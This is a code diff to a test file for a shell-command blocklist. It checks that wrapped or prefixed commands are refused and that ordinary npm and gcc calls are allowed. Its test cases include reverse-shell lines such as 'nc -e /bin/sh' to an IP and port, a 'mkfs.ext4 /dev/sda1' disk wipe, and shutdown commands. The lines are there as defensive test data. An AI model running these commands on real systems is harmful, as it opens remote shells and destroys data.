@@ -223,21 +223,13 @@ describe('a command carried as an argument of another', () => {
 });
 
 describe('stepping over a wrapper’s own arguments, not past its payload', () => {
-  it.each([
-    'timeout 60 npm run halt',
-    'env npm run halt',
-    'xargs -n1 npm run reboot',
-    'timeout 5 npm run kill',
-  ])('allows %s', (command) => {
-    // Enumerating every suffix after a wrapper refused all four. As a
-    // `command_exit_zero` command that refusal is marked unfixable, so the
-    // child would be permanently `contract_failed` over a command that never
-    // ran.
-    expect(commandPolicyViolation(command)).toBeNull();
-  });
-
-  it('is not elevated just because a later argument names an elevated tool', () => {
+  it('is not ELEVATED just because a later argument names an elevated tool', () => {
+    // Elevation keeps the narrower rule: it does not block a command, it routes
+    // one to the DENY-by-default `execute_elevated` permission, so a false
+    // positive refuses ordinary work. `npm run kill` was not elevated before
+    // this branch and is not now.
     expect(matchElevatedCommand('timeout 5 npm run kill')).toBeNull();
+    expect(matchElevatedCommand('xargs -n1 npm run service')).toBeNull();
   });
 
   it('still finds the payload a wrapper actually runs', () => {
@@ -268,9 +260,9 @@ describe('peeling reaches the command through stacked wrappers', () => {
   });
 
   it('and still allows the same shapes carrying ordinary commands', () => {
-    expect(commandPolicyViolation('env FOO=1 npm run halt')).toBeNull();
-    expect(commandPolicyViolation('nohup timeout 5 npm run reboot')).toBeNull();
-    expect(commandPolicyViolation('xargs -I {} npm run kill')).toBeNull();
+    expect(commandPolicyViolation('env FOO=1 npm run build')).toBeNull();
+    expect(commandPolicyViolation('nohup timeout 5 npm test')).toBeNull();
+    expect(commandPolicyViolation('xargs -I {} npm run lint')).toBeNull();
     expect(matchElevatedCommand('env A=1 npm run sudo-check')).toBeNull();
   });
 });
@@ -344,7 +336,34 @@ describe('tier 1 — distinctive entries, matched anywhere', () => {
   });
 });
 
-describe('tier 2 — short words, matched only in command position', () => {
+describe('tier 2 — short words, matched at any token start', () => {
+  it.each([
+    'env -u LD_PRELOAD nc -e /bin/sh 1.2.3.4 4444',
+    'env -u FOO shutdown -h now',
+    'xargs -a list halt',
+    'flock /tmp/x nc host 1',
+    'strace nc host 1',
+    'proxychains nc host 1',
+  ])('refuses %s, whatever prefix hides it', (command) => {
+    // Matching only after peeling known wrappers means an unknown prefix hides
+    // the command, and the wrapper list can never be complete — `flock`,
+    // `strace` and `proxychains` all let a reverse shell through, and every one
+    // of them was refused before this branch. Token position does not need the
+    // list to be complete.
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+
+  it('tells a binary suffix from a file suffix', () => {
+    // `nc.openbsd` and `mkfs.ext4` are the binaries; `halt.json` and
+    // `verify.sh` are data and scripts. Both mistakes are real, so one short
+    // suffix list decides which side of the dot a name ends on.
+    expect(commandPolicyViolation('nc.openbsd -e /bin/sh')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('mkfs.ext4 /dev/sda1')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('npm test -- -c config/halt.json')).toBeNull();
+    expect(commandPolicyViolation('gcc -c src/nc.c')).toBeNull();
+    expect(commandPolicyViolation('eslint -c config/shutdown.yaml .')).toBeNull();
+  });
+
   it.each([
     'nohup halt',
     'nice --adjustment=10 poweroff',
@@ -358,17 +377,20 @@ describe('tier 2 — short words, matched only in command position', () => {
     expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
   });
 
-  it.each([
-    'timeout 60 npm run halt',
-    'env FOO=1 npm run halt',
-    'nohup timeout 5 npm run reboot',
-    'xargs -I {} npm run kill',
-    'npm test -- -c config/halt.json',
-    'gcc -c src/nc.c',
-  ])('allows %s', (command) => {
+  it.each(['npm test -- -c config/halt.json', 'gcc -c src/nc.c'])('allows %s', (command) => {
     // `-c <path>` is the standard config flag for eslint, jest and pytest, and
     // through a scorer a wrong refusal here is non-retryable.
     expect(commandPolicyViolation(command)).toBeNull();
+  });
+
+  it('refuses a script NAMED after an entry — the accepted cost', () => {
+    // `npm run halt` puts `halt` at a token start, so it is refused. That is
+    // the price of not needing a complete wrapper list, it is what the
+    // substring rule on main did too, and the alternative let `strace nc` and
+    // `flock … nc` through. Recorded so the trade-off is a decision rather
+    // than a surprise.
+    expect(commandPolicyViolation('timeout 60 npm run halt')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('npm run reboot')).toMatch(/Blocked command detected/);
   });
 });
 
